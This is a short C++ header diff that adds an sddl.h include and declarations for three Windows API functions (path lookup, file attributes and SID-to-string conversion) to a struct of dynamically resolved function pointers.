@@ -6,6 +6,7 @@
 #include "../utils/apidefs.hpp"
 #include <wininet.h>
 #include <iphlpapi.h>
+#include <sddl.h>
 
 
 #define DECL(x) decltype(x) * x;
@@ -96,11 +97,14 @@ typedef struct {
 		DECL(CloseHandle);
 		DECL(GetProcAddress);
 		DECL(CreateDirectoryA);
+		DECL(GetFullPathNameA);
+		DECL(GetFileAttributesA);
 
 		DECL(GetUserNameA);
 		DECL(GetTokenInformation);
 		DECL(LookupPrivilegeNameA);
 		DECL(LookupAccountSidA);
+		DECL(ConvertSidToStringSidA);
 
 
 		DECL(GetAdaptersInfo);
